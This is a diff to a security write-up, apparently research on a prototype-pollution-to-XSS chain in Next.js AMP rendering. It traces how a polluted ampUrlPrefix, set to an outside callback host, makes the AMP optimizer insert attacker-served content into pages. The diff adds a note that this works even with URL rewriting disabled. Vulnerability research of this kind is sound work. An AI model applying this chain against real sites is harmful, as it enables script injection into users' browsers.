@@ -65,18 +65,24 @@ const ampState = {
 const inAmpMode = !process.browser && (0, _amp).isInAmpMode(ampState); // isInAmpMode() { return ampFirst || hybrid && hasQuery }
 // ...
 html = await optimizeAmp(html, renderOpts.ampOptimizerConfig);
+```
 
+```js
 /* next/server/optimize-amp.ts */
 const optimizer = AmpOptimizer.create(config);
 return optimizer.transformHtml(html, config); // config.ampUrlPrefix = 'https://xss-callback.pwnfunction.repl.co/'
+```
 
+```js
 /* @ampproject/toolbox-optimizer/index.js */
 async transformHtml(t, e) {
     const r = await i.parse(t);
     await this.transformTree(r, e);
     return i.serialize(r);
 }
+```
 
+```js
 /* `transformTree` eventually leads to the following */
 5690: (t, e, r) => {
     // ...
@@ -97,6 +103,9 @@ async transformHtml(t, e) {
 
 > Note: In `next.config.js`, we skip validation `skipValidation: true`.
 > This is to disable `SeparateKeyframes` (`fn 1053`) - `@ampproject/toolbox-optimizer/index.js` throws `filter on undefined` due to prototype pollution. (Lazy fix)
+
+> Also while initializing runtime styles in `@ampproject/toolbox-optimizer`, response body from `ampUrlPrefix` is inserted directly to the page,
+> meaning one can still achieve XSS even if `RewriteAmpUrls` transformer is disabled.
 
 ## Redirect SSR
 
